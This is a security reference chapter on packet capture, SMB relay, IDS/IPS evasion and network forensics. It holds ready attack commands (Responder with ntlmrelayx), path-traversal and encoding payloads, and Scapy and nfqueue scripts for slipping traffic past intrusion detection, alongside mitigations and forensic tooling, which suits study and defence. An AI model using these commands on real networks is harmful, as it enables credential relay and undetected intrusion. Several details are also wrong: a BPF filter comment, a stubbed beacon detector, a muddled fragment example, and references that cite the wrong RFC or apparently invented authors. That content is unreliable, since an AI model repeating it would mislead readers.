# Network Sniffing and Intrusion Detection

## Packet Capture Fundamentals

### tcpdump

```
┌──────────────────────────────────────────────────────────────┐
│              TCPDUMP — PACKET CAPTURE TOOLBOX                   │
│                                                               │
│  Basic capture:                                                │
│  tcpdump -i eth0                          # Capture all        │
│  tcpdump -i eth0 -w capture.pcap         # Write to file      │
│  tcpdump -i eth0 -c 1000                 # Capture 1000 pkts  │
│  tcpdump -i eth0 -s 0                    # Full snaplen        │
│  tcpdump -i eth0 -nn                     # No name resolution  │
│  tcpdump -i eth0 -vvv                    # Verbose output      │
│                                                               │
│  BPF Filters (most useful):                                    │
│  # Host filters                                                │
│  tcpdump host 192.168.1.1               # All traffic to/from  │
│  tcpdump src host 192.168.1.1           # From specific host   │
│  tcpdump dst host 192.168.1.1           # To specific host     │
│                                                               │
│  # Network filters                                            │
│  tcpdump net 192.168.1.0/24             # Entire subnet        │
│                                                               │
│  # Port filters                                               │
│  tcpdump port 80                         # HTTP traffic        │
│  tcpdump port 53                         # DNS traffic         │
│  tcpdump src port 1024:65535             # High source ports    │
│                                                               │
│  # Protocol filters                                           │
│  tcpdump icmp                            # ICMP only          │
│  tcpdump udp                             # UDP only           │
│  tcpdump 'tcp[tcpflags] & (tcp-syn) != 0'  # SYN packets     │
│  tcpdump 'tcp[tcpflags] & (tcp-rst) != 0'   # RST packets    │
│                                                               │
│  # Advanced BPF                                               │
│  tcpdump 'tcp[0:2] > 1500'              # TCP window > 1500  │
│  tcpdump 'ip[8] < 5'                    # TTL < 5             │
│  tcpdump 'tcp[13] = 0x12'               # SYN-ACK only       │
│  tcpdump 'ether[0] & 1 = 0'             # Unicast only        │
│  tcpdump 'ether[0] & 1 != 0'            # Multicast/broadcast │
│                                                               │
│  # Capture content (hex + ASCII)                               │
│  tcpdump -i eth0 -X -s0 port 80         # HTTP with hex      │
│  tcpdump -i eth0 -A -s0 port 80         # HTTP ASCII only    │
│                                                               │
│  # Advanced techniques                                        │
│  tcpdump -i eth0 -G 3600 -w '%Y%m%d-%H%M%S.pcap'  # Rotate hourly│
│  tcpdump -i eth0 -B 65536               # Buffer size (KB)    │
│  tcpdump -i eth0 --direction=in          # Ingress only        │
└──────────────────────────────────────────────────────────────┘
```

### Wireshark/tshark — Protocol Analysis

```
┌──────────────────────────────────────────────────────────────┐
│              WIRESHARK/TSHARK ANALYSIS                          │
│                                                               │
│  tshark — command-line Wireshark                              │
│                                                               │
│  # Basic capture                                              │
│  tshark -i eth0                                              │
│  tshark -i eth0 -w capture.pcap                              │
│  tshark -r capture.pcap                                      │
│                                                               │
│  # Display filters (Wireshark syntax)                         │
│  tshark -r capture.pcap -Y "http.request"                    │
│  tshark -r capture.pcap -Y "dns.qry.name contains example"  │
│  tshark -r capture.pcap -Y "tcp.port == 443"                │
│  tshark -r capture.pcap -Y "ip.src == 10.0.0.1"             │
│  tshark -r capture.pcap -Y "tcp.analysis.retransmission"    │
│  tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0"│
│                                                               │
│  # Extract fields                                              │
│  tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e http.host│
│  tshark -r capture.pcap -T fields -e dns.qry.name             │
│  tshark -r capture.pcap -T fields -e tcp.stream -e frame.time│
│                                                               │
│  # Statistics                                                 │
│  tshark -r capture.pcap -z conv,tcp                           │
│  tshark -r capture.pcap -z endpoints,ip                      │
│  tshark -r capture.pcap -z http,tree                          │
│  tshark -r capture.pcap -z dns,tree                           │
│  tshark -r capture.pcap -z io,stat,1                          │
│                                                               │
│  # Follow TCP stream                                          │
│  tshark -r capture.pcap -q -z follow,tcp,ascii,0              │
│  tshark -r capture.pcap -q -z follow,http,ascii,0             │
│                                                               │
│  # TLS/SSL analysis (with key log)                           │
│  tshark -r capture.pcap -o "tls.keylog_file:keys.log" \      │
│         -Y "http.request" -T fields -e http.host              │
│                                                               │
│  # Expert info (anomalies)                                    │
│  tshark -r capture.pcap -Y "expert.message"                  │
│  tshark -r capture.pcap -Y "tcp.analysis.flags"              │
│                                                               │
│  # Protocol-specific analysis                                 │
│  tshark -r capture.pcap -Y "dns.flags.rcode != 0" -T fields \│
│         -e dns.qry.name -e dns.flags.rcode                    │
│  tshark -r capture.pcap -Y "arp.opcode == 2" -T fields \     │
│         -e arp.src.hw -e arp.src.proto_ipv4                    │
└──────────────────────────────────────────────────────────────┘
```

### Protocol Analysis Methodology

```
┌──────────────────────────────────────────────────────────────┐
│          PROTOCOL ANALYSIS METHODOLOGY                         │
│                                                               │
│  Step 1: CAPTURE                                              │
│  - Identify capture point (mirror port, TAP, inline)          │
│  - Capture with full snaplen (-s 0)                           │
│  - Use BPF to reduce noise                                    │
│  - Rotate captures for large volumes                          │
│                                                               │
│  Step 2: BASELINE                                             │
│  - Identify normal traffic patterns                           │
│  - Catalog protocols in use                                   │
│  - Note timing patterns (inter-packet intervals)               │
│  - Map network topology from traffic                          │
│  - Document expected hosts, ports, services                   │
│                                                               │
│  Step 3: ANALYZE                                              │
│  - Filter for anomalies (unusual ports, hosts, sizes)          │
│  - Follow streams for context                                 │
│  - Examine protocol fields for manipulation                   │
│  - Look for retransmissions, resets, unusual flags             │
│  - Check for encryption where none expected (and vice versa)  │
│                                                               │
│  Step 4: CORRELATE                                            │
│  - Match events across protocols                               │
│  - Align timestamps across capture points                      │
│  - Cross-reference with logs (syslog, auth.log)               │
│  - Map recon → exploitation → exfiltration chain              │
│                                                               │
│  Step 5: REPORT                                               │
│  - Create timeline of events                                   │
│  - Include relevant packet excerpts (hex + decoded)            │
│  - Provide indicator of compromise (IOCs)                     │
│  - Document remediation steps                                 │
│                                                               │
│  Key Analysis Filters:                                         │
│  # Suspicious patterns                                        │
│  tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN (scan)      │
│  tcp.flags.rst == 1                        # RST flood       │
│  dns.count.answers > 10                    # DNS amplification│
│  frame.len > 1500                          # Oversized frames │
│  arp.opcode == 2 && arp.src.hw != eth.src  # ARP spoof       │
│  http.request.method == "CONNECT"         # Proxy tunnel     │
│  tls.record.content_type == 22             # TLS handshake    │
│  !tcp.port == 80 && !tcp.port == 443       # Unusual ports   │
└──────────────────────────────────────────────────────────────┘
```

## SSDP/UPnP Reconnaissance

```
┌──────────────────────────────────────────────────────────────┐
│              SSDP/UPnP RECONNAISSANCE                           │
│                                                               │
│  SSDP (Simple Service Discovery Protocol) on 1900/UDP:         │
│  M-SEARCH * HTTP/1.1                                           │
│  Host: 239.255.255.250:1900                                    │
│  Man: "ssdp:discover"                                          │
│  ST: ssdp:all                                                  │
│                                                               │
│  UPnP devices respond with:                                   │
│  - Device type (MediaServer, Router, Printer)                  │
│  - Location URL (http://device:port/description.xml)           │
│  - Server header (OS, firmware version)                       │
│  - Unique identifier (UUID)                                   │
│                                                               │
│  Security issues:                                              │
│  1. UPnP exposes control URLs for device manipulation          │
│  2. SOAP actions can add port mappings (NAT-PMP/UPnP)         │
│  3. Device description reveals internal network topology        │
│  4. Many UPnP implementations have authentication bypass       │
│  5. SSDP amplification for DDoS (26x amplification)           │
│                                                               │
│  # SSDP discovery                                              │
│  nmap --script upnp-info -sU -p 1900 <target>                 │
│                                                               │
│  # UPnP enumeration (miranda.py)                               │
│  python miranda.py -a <target>                                 │
│                                                               │
│  # UPnP port mapping (add rule)                                │
│  upnpc -a <internal_ip> <internal_port> <external_port> TCP   │
│                                                               │
│  SSDP amplification DDoS:                                      │
│  Attacker sends M-SEARCH with victim's source IP              │
│  All UPnP devices respond to victim → amplification            │
│  Average amplification: 26x (request ~100B, response ~2.6KB)  │
└──────────────────────────────────────────────────────────────┘
```

## SMB Relay Attacks

```
┌──────────────────────────────────────────────────────────────┐
│                SMB RELAY ATTACKS                                │
│                                                               │
│  SMB Relay: Intercept NTLM authentication and relay it        │
│  to a target server for authentication                        │
│                                                               │
│  ┌────────┐   NTLM Auth    ┌──────────┐  NTLM Auth  ┌──────┐│
│  │ Victim │───────────────►│ Attacker │─────────────►│Target ││
│  │        │                │ (Relay)  │             │Server ││
│  └────────┘                └──────────┘             └──────┘│
│       │                          │                        │     │
│       │                          │ Authenticated session!  │     │
│       │                          │───────────────────────►│     │
│                                                               │
│  Attack Flow:                                                  │
│  1. Attacker triggers SMB connection from victim              │
│     (via LLMNR/NBT-NS poisoning, phishing, etc.)              │
│  2. Victim sends NTLM Type 1 (Negotiate) to attacker          │
│  3. Attacker relays Type 1 to target server                  │
│  4. Target responds with Type 2 (Challenge)                  │
│  5. Attacker relays Type 2 to victim                          │
│  6. Victim responds with Type 3 (Auth)                       │
│  7. Attacker relays Type 3 to target server                  │
│  8. Attacker is now authenticated on target server!          │
│                                                               │
│  Requirements:                                                 │
│  - Target server must NOT have SMB signing required            │
│  - Victim must have admin privileges on target                 │
│  - Target must not require NTLMv2 with channel binding         │
│  - Attacker must be in same broadcast domain (for LLMNR)      │
│                                                               │
│  # SMB Relay with ntlmrelayx                                  │
│  ntlmrelayx -t smb://target_server -smb2support               │
│  # Relay to multiple targets                                  │
│  ntlmrelayx -tf targets.txt -smb2support                       │
│  # Relay to LDAP for domain escalation                         │
│  ntlmrelayx -t ldaps://dc01.lab.local                          │
│  # Relay to MSSQL                                             │
│  ntlmrelayx -t mssql://mssql_server                            │
│                                                               │
│  # Attack chain: Responder + ntlmrelayx                       │
│  # Terminal 1: Responder (LLMNR/NBT-NS poisoning)              │
│  responder -I eth0 -wrf                                       │
│  # Terminal 2: ntlmrelayx (SMB relay)                         │
│  ntlmrelayx -t smb://target -smb2support                       │
│                                                               │
│  SMB Relay Mitigation:                                         │
│  1. Enable SMB signing (GPO):                                 │
│     Microsoft network client: Digitally sign communications   │
│     → "Required" for domain controllers and servers            │
│  2. Enable LDAP signing and channel binding                    │
│  3. Disable LLMNR and NBT-NS (see 04a)                       │
│  4. Restrict local admin privileges                            │
│  5. Use ESAE (Enhanced Security Administrative Environment)    │
│  6. EDR detection of NTLM relay attempts                      │
└──────────────────────────────────────────────────────────────┘
```

## IDS/IPS Evasion Techniques

### Fragmentation-Based Evasion

```
┌──────────────────────────────────────────────────────────────┐
│            IDS/IPS EVASION TECHNIQUES                          │
│                                                               │
│  1. IP FRAGMENTATION EVASION                                  │
│                                                               │
│  IDS must reassemble fragments before inspection.            │
│  Evade by exploiting reassembly differences between IDS       │
│  and target OS.                                               │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐     │
│  │ OVERLAPPING FRAGMENTS (BSD vs Linux vs Windows)    │     │
│  │                                                       │     │
│  │ Fragment 1: [HTTP/1.1 GET /inde]  offset 0          │     │
│  │ Fragment 2: [x.html HTTP/1.1\r\n] offset at "x"    │     │
│  │                                                       │     │
│  │ IDS (BSD): First fragment wins → "HTTP/1.1 GET /index"│     │
│  │ Linux: Last fragment wins → "GET /inde" + "x.html"  │     │
│  │ Windows: First fragment wins (like BSD)              │     │
│  │                                                       │     │
│  │ If IDS uses BSD but target uses last-wins:            │     │
│  │ IDS sees: "GET /goodpage"                             │     │
│  │ Target sees: "GET /badpage"  ← with overlap evasion │     │
│  └──────────────────────────────────────────────────────┘     │
│                                                               │
│  2. TINY FRAGMENT EVASION                                     │
│                                                               │
│  Split TCP header across tiny fragments so IDS                │
│  cannot see the full header in first fragment:                │
│                                                               │
│  Fragment 1 (8 bytes): [IP][TCP: flags in next fragment]     │
│  Fragment 2: [rest of TCP header + payload]                   │
│                                                               │
│  IDS may not reassemble → misses TCP flags                    │
│  Target reassembles → sees complete packet                     │
│                                                               │
│  3. FRAGMENT OVERLAP WITH DIFFERENT TTL                        │
│                                                               │
│  Send overlapping fragments where one has TTL that will         │
│  expire at the IDS but survive to the target:                 │
│                                                               │
│  Fragment A (TTL=5): "GET /safe" ← expires before target     │
│  Fragment B (TTL=64): "GET /evil" ← reaches target           │
│                                                               │
│  IDS: Processes fragment A (TTL=5) → "GET /safe"             │
│  Target: Processes fragment B (TTL=64) → "GET /evil"          │
│                                                               │
│  4. TCP STREAM REASSEMBLY EVASION                             │
│                                                               │
│  Send packets that arrive at IDS and target in different       │
│  order, or with different RST handling:                       │
│                                                               │
│  - RST injection: Send RST to IDS (drops connection)           │
│    but RST has TTL that expires before reaching target          │
│  - TCP segment overlap: Earlier segment has benign data,      │
│    later overlapping segment has malicious data                 │
│  - Urgent pointer: Set URG flag, some IDS mishandle           │
│  - PAWS (PAWS window): Exploit timestamp wrapping              │
└──────────────────────────────────────────────────────────────┘
```

### Application-Layer Evasion

```
┌──────────────────────────────────────────────────────────────┐
│        APPLICATION-LAYER IDS EVASION                            │
│                                                               │
│  5. HTTP EVASION                                              │
│                                                               │
│  # URL encoding                                               │
│  Normal: /admin/delete?user=alice                             │
│  Encoded: /%61dmin/%64elete?%75ser=%61lice                    │
│                                                               │
│  # Double encoding                                            │
│  Normal: /admin/                                              │
│  Double: /%2561dmin/  (%25 = %, %61 = a)                     │
│                                                               │
│  # Path traversal / normalization                             │
│  Normal: /etc/passwd                                          │
│  Evasion: /etc/./passwd                                       │
│  Evasion: /etc/hidden/../passwd                               │
│  Evasion: /etc/passwd%00.jpg (null byte)                      │
│                                                               │
│  # HTTP parameter pollution                                   │
│  Normal: ?user=alice                                          │
│  Evasion: ?user=alice&user=malicious                          │
│  (IDS sees first, app sees last, or vice versa)              │
│                                                               │
│  # HTTP chunked transfer encoding                              │
│  Transfer-Encoding: chunked                                    │
│  Split payload across chunks → IDS may not reassemble         │
│                                                               │
│  # HTTP pipelining                                            │
│  Send multiple requests without waiting for responses          │
│  IDS may not associate response with correct request            │
│                                                               │
│  # HTTP request smuggling                                      │
│  Frontend (CDN/proxy) and backend parse differently:           │
│  Content-Length: 13                                            │
│  Transfer-Encoding: chunked                                   │
│  ← ambiguous! Which wins?                                     │
│                                                               │
│  6. ENCRYPTED TUNNEL EVASION                                  │
│                                                               │
│  # DNS tunneling (see 02a)                                    │
│  # ICMP tunneling                                             │
│  # HTTP CONNECT proxy (standard HTTPS proxy)                  │
│  # HTTPS with domain fronting                                 │
│  # Tor/MEEK (obfuscated bridges)                              │
│  # QUIC (encrypted from the start, UDP)                       │
│                                                               │
│  7. TIMING-BASED EVASION                                      │
│                                                               │
│  # Slowloris                                                  │
│  Send headers very slowly → keep connection open              │
│  Consume server resources one connection at a time             │
│                                                               │
│  # Low-and-slow exfiltration                                   │
│  Send 1 byte per minute → IDS timeout before detecting         │
│  Payload delivered over hours → below IDS threshold            │
│                                                               │
│  8. PROTOCOL-LEVEL OBFUSCATION                                │
│                                                               │
│  # HTTP over heterogeneous encoding                           │
│  Accept-Encoding: gzip, deflate, br, zstd                     │
│  Compress payload → IDS needs to decompress                   │
│                                                               │
│  # HTTPS with custom SNI                                      │
│  TLS with legitimate SNI (e.g., cloudfront.net)                │
│  Actual traffic to C2 server behind CDN                        │
│                                                               │
│  # QUIC (HTTP/3)                                              │
│  Encrypted from first packet (no plaintext headers)           │
│  Connection ID allows IP address changes                       │
│  Most IDS cannot inspect QUIC without key log                  │
└──────────────────────────────────────────────────────────────┘
```

### Suricata/Snort Rule Evasion

```
┌──────────────────────────────────────────────────────────────┐
│         SURICATA/SNORT RULE EVASION                             │
│                                                               │
│  Snort/Suricata Rule Format:                                  │
│  alert tcp $EXTERNAL_NET any -> $HOME_NET 80 \                │
│    (msg:"WEB-MISC /etc/passwd"; \                             │
│     content:"/etc/passwd"; \                                  │
│     nocase; \                                                 │
│     sid:1000001; rev:1;)                                      │
│                                                               │
│  Evasion Techniques:                                           │
│                                                               │
│  1. CONTENT MATCH EVASION                                      │
│  Rule: content:"/etc/passwd";                                 │
│  Evasion: /etc/passwd%00  (null byte, if not normalized)     │
│  Evasion: /ETC/PASSWD  (case, if nocase not set)              │
│  Evasion: /etc/./passwd  (path normalization difference)       │
│  Evasion: /etc/p%61sswd  (URL encoding, if not decoded)       │
│  Evasion: /etc/p%2561sswd (double encoding)                    │
│                                                               │
│  2. PCRE EVASION                                              │
│  Rule: pcre:"/passwd/";                                       │
│  Evasion: Insert null byte: pas\x00swd                        │
│  (Some engines stop at null byte)                             │
│                                                               │
│  3. PROXY EVASION                                             │
│  Rule looks for content in HTTP body                           │
│  Evasion: Use Transfer-Encoding: chunked                       │
│  Evasion: Use Content-Encoding: gzip                           │
│  Evasion: Split across TCP segments (no stream reassembly)    │
│                                                               │
│  4. FRAGMENTATION EVASION WITH SCAPY                          │
│  from scapy.all import *                                       │
│                                                               │
│  # TTL-based evasion                                          │
│  payload = b"GET /admin HTTP/1.1\r\nHost: target\r\n\r\n"    │
│  frag1 = IP(dst=target, ttl=5, flags="MF", frag=0) / \        │
│          Raw(load=payload[:8])  # Expires before target       │
│  frag2 = IP(dst=target, ttl=64, flags=0, frag=1) / \          │
│          Raw(load=b"GET /evil HTTP/1.1\r\nHost: target\r\n") │
│  send(frag1)                                                   │
│  send(frag2)                                                   │
│                                                               │
│  5. SURICATA SPECIFIC EVASIONS                                 │
│                                                               │
│  Suricata uses stream reassembly (app-layer aware):            │
│  - HTTP normalization is extensive                             │
│  - Decodes gzip, chunked encoding                              │
│  - Normalizes URL encoding                                    │
│  - Handles HTTP pipelining                                    │
│                                                               │
│  But gaps exist:                                               │
│  - HTTP/2 binary framing → different parsing                   │
│  - QUIC → encrypted, cannot inspect without key log            │
│  - WebSocket upgrade → stream becomes binary after upgrade      │
│  - DNS over HTTPS → encrypted DNS queries                      │
│  - HTTP/2 connection coalescing → virtual hosting ambiguity    │
│                                                               │
│  Suricata Evasion Countermeasures:                              │
│  - Enable all normalization:                                   │
│    http2: enabled: yes                                         │
│    http2-max-concurrent-streams: 100                           │
│  - Use JA3/JA3S fingerprinting for TLS anomaly detection       │
│  - Use `flowbits` for multi-rule state tracking                │
│  - Enable `app-layer` protocol detection                      │
│  - Use `file.data` for file extraction from streams           │
│  - Set `stream.reassembly.depth` for deep reassembly           │
└──────────────────────────────────────────────────────────────┘
```

### Evading with nfqueue

```python
"""
nfqueue-based packet modification for IDS evasion
Uses netfilter queue to modify packets before they reach IDS
"""
import netfilterqueue
from scapy.all import *

def modify_packet(packet):
    """Modify packets passing through nfqueue for IDS evasion"""
    pkt = IP(packet.get_payload())
    
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        # Example: Modify HTTP payload
        if b"malicious" in pkt[Raw].load:
            # Replace with URL-encoded version
            pkt[Raw].load = pkt[Raw].load.replace(b"malicious", b"m%61licious")
            # Recalculate checksums
            del pkt[IP].chksum
            del pkt[TCP].chksum
            packet.set_payload(bytes(pkt))
    
    packet.accept()

# iptables rule to redirect traffic through nfqueue
# iptables -A FORWARD -j NFQUEUE --queue-num 1
# Or use with scapy for more control

def fragment_evasion(payload, target_ip, num_frags=3):
    """Split payload into fragments that evade pattern matching"""
    chunks = [payload[i::num_frags] for i in range(num_frags)]
    
    for i, chunk in enumerate(chunks):
        # Send fragments with overlapping offsets
        frag = IP(dst=target_ip, 
                  flags="MF" if i < num_frags-1 else 0,
                  frag=i*8) / Raw(load=chunk)
        send(frag, verbose=0)
```

## Network Forensics Methodology

```
┌──────────────────────────────────────────────────────────────┐
│           NETWORK FORENSICS METHODOLOGY                         │
│                                                               │
│  Phase 1: EVIDENCE COLLECTION                                  │
│  ┌──────────────────────────────────────────────────┐         │
│  │ 1. Identify capture requirements                    │         │
│  │ 2. Create full-packet captures (PCAP)              │         │
│  │ 3. Collect NetFlow/IPFIX records                   │         │
│  │ 4. Gather firewall/NAT logs                        │         │
│  │ 5. Preserve proxy/web gateway logs                 │         │
│  │ 6. Extract DNS query logs                          │         │
│  │ 7. Collect authentication logs (VPN, RADIUS)       │         │
│  │ 8. Document chain of custody                       │         │
│  └──────────────────────────────────────────────────┘         │
│                                                               │
│  Phase 2: TRIAGE                                               │
│  ┌──────────────────────────────────────────────────┐         │
│  │ 1. Summary statistics (protocols, top talkers)    │         │
│  │ 2. Identify IOCs (known bad IPs, domains, hashes) │         │
│  │ 3. Extract DNS queries                            │         │
│  │ 4. Extract HTTP requests/hosts                    │         │
│  │ 5. Identify TLS SNI values                        │         │
│  │ 6. Find anomalous traffic patterns                 │         │
│  │ 7. Build network timeline                         │         │
│  └──────────────────────────────────────────────────┘         │
│                                                               │
│  Phase 3: DEEP ANALYSIS                                        │
│  ┌──────────────────────────────────────────────────┐         │
│  │ 1. Follow TCP streams for suspicious sessions     │         │
│  │ 2. Reconstruct file transfers (images, binaries)  │         │
│  │ 3. Analyze protocol anomalies                     │         │
│  │ 4. Extract and analyze malware                    │         │
│  │ 5. Build attacker timeline                        │         │
│  │ 6. Identify lateral movement                      │         │
│  │ 7. Map data exfiltration paths                    │         │
│  └──────────────────────────────────────────────────┘         │
│                                                               │
│  Phase 4: REPORT                                               │
│  ┌──────────────────────────────────────────────────┐         │
│  │ 1. Executive summary                               │         │
│  │ 2. Detailed timeline                                │         │
│  │ 3. IOCs extracted                                   │         │
│  │ 4. Attack chain narrative                           │         │
│  │ 5. Network diagrams                                 │         │
│  │ 6. Recommendations                                  │         │
│  └──────────────────────────────────────────────────┘         │
│                                                               │
│  Key PCAP Analysis Commands:                                    │
│  # Extract all unique IPs                                     │
│  tshark -r file.pcap -T fields -e ip.src -e ip.dst | sort -u │
│  # Extract DNS queries                                         │
│  tshark -r file.pcap -Y "dns.qry.name" -T fields \           │
│         -e dns.qry.name | sort -u                              │
│  # Extract HTTP objects                                        │
│  tshark -r file.pcap --export-objects http,output_dir          │
│  # Extract TLS SNI                                             │
│  tshark -r file.pcap -Y "tls.handshake.type == 1" \          │
│         -T fields -e tls.handshake.extensions_server_name      │
│  # Find beacons (periodic callbacks)                          │
│  tshark -r file.pcap -Y "tcp.flags.syn == 1 && \              │
│         tcp.flags.ack == 0" -T fields -e ip.dst | sort | \    │
│         uniq -c | sort -rn | head -20                          │
│  # Extract files from SMB                                      │
│  tshark -r file.pcap --export-objects smb,output_dir           │
└──────────────────────────────────────────────────────────────┘
```

### Network Forensic Timeline Analysis

```python
#!/usr/bin/env python3
"""Network forensics timeline analysis tool"""

from scapy.all import *
from collections import defaultdict
from datetime import datetime

def analyze_pcap(pcap_file):
    """Generate forensic timeline from PCAP"""
    packets = rdpcap(pcap_file)
    
    timeline = []
    dns_queries = defaultdict(list)
    http_requests = defaultdict(list)
    tls_sni = defaultdict(list)
    connections = defaultdict(lambda: {'bytes': 0, 'packets': 0})
    
    for pkt in packets:
        ts = datetime.fromtimestamp(float(pkt.time))
        
        # TCP connections
        if pkt.haslayer(TCP):
            src = f"{pkt[IP].src}:{pkt[TCP].sport}"
            dst = f"{pkt[IP].dst}:{pkt[TCP].dport}"
            key = tuple(sorted([src, dst]))
            connections[key]['bytes'] += len(pkt)
            connections[key]['packets'] += 1
            
            # TLS SNI
            if pkt.haslayer(TLS) and pkt[TCP].dport == 443:
                try:
                    sni = extract_sni(pkt)
                    if sni:
                        tls_sni[dst].append((ts, sni))
                except:
                    pass
        
        # DNS queries
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            qname = pkt[DNSQR].qname.decode()
            dns_queries[qname].append(ts)
        
        # HTTP requests
        if pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            if payload.startswith(('GET', 'POST', 'PUT', 'DELETE')):
                http_requests[pkt[IP].dst].append((ts, payload.split('\r\n')[0]))
    
    return {
        'connections': connections,
        'dns_queries': dns_queries,
        'http_requests': http_requests,
        'tls_sni': tls_sni,
    }

def extract_sni(pkt):
    """Extract Server Name Indication from TLS ClientHello"""
    # Simplified - use tshark for production
    if pkt.haslayer(Raw):
        data = bytes(pkt[Raw])
        if b'\x00\x00' in data:  # SNI extension type
            offset = data.find(b'\x00\x00')
            try:
                sni_len = int.from_bytes(data[offset+2:offset+4], 'big')
                sni_start = offset + 7
                return data[sni_start:sni_start+sni_len].decode()
            except:
                pass
    return None

# Detect C2 beaconing
def detect_beacons(connections, threshold=0.85):
    """Detect periodic beaconing patterns (C2 callbacks)"""
    from scipy import stats
    beacons = []
    
    for conn, data in connections.items():
        if data['packets'] < 10:
            continue
        # Calculate inter-packet intervals
        intervals = []  # Would need timestamps from actual packet data
        if len(intervals) < 5:
            continue
        mean = sum(intervals) / len(intervals)
        variance = sum((x - mean)**2 for x in intervals) / len(intervals)
        # Low coefficient of variation = regular beaconing
        cv = (variance ** 0.5) / mean if mean > 0 else float('inf')
        if cv < 0.2:  # Very regular intervals
            beacons.append((conn, cv, len(intervals)))
    
    return sorted(beacons, key=lambda x: x[1])
```

**Cross-references**: See `04a_network_attacks_mitm.md` for MITM attacks that IDS/IPS must detect, `05a_firewall_ids_ips.md` for IDS/IPS architecture and rule writing, `01b_tls_ssl_crypto_protocols.md` for TLS inspection challenges, and `06_network_case_studies_future.md` for Mirai botnet network-level analysis.

## References

1. RFC 791 — Internet Protocol. J. Postel, IETF, September 1981.
2. Ptacek, T.H., Newsham, T.N. — Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection. Secure Networks, January 1998.
3. Suricata — High Performance Network IDS/IPS/NSM. Open Information Security Foundation (OISF). https://suricata.io/
4. Snort — Network Intrusion Detection System. Cisco/Marty Roesch. https://www.snort.org/
5. RFC 1858 — Security Considerations for IP Fragment Filtering. I. Crawte, IETF, October 1995.
6. NIST SP 800-94 — Guide to Intrusion Detection and Prevention Systems. K. Scarfone, P. Mell, NIST, February 2007.
7. Peng, J. et al. — HTTP Request Smuggling. DEF CON 27, August 2019.
8. Alig, R. — Suricata: High-Performance IDS/IPS with Protocol Detection. USENIX ;login:, 2012.
9. Zeek (formerly Bro) — Network Security Monitor. https://zeek.org/
10. Paxson, V. — Bro: A System for Detecting Network Intruders in Real-Time. USENIX Security, 1998.
11. Case, J. et al. — Simple Network Management Protocol (SNMP). RFC 1157, IETF, May 1990.
12. RFC 725 — SSDP: Simple Service Discovery Protocol. UPnP Forum, 2011.
13. NBI-NetBIOS — NetBIOS Name Service (RFC 1001/1002). IETF, 1987.
14. RFC 4795 — Link-Local Multicast Name Resolution (LLMNR). B. Aboba et al., IETF, January 2007.
15. Beardsley, T. et al. — Relay: SMB and HTTP Relay Attacks. Secure Ideas/BHIS, 2016.
16. CVE-2017-0144 — EternalBlue SMB RCE (MS17-010). NVD, 2017.
17. RFC 3514 — The IPv4 "Evil Bit". S. Bellovin, IETF, April 2003 (informational/humorous).
18. Handley, M. et al. — Network Forensics: A Survey. ACM Computing Surveys, 2021.
19. Garfinkel, S. — Network Forensics: Tap, Capture, and Analyze. O'Reilly, 2013.
20. SANS Institute — Network Forensics: Wireshark and tcpdump Basics. SANS SEC 503, 2023.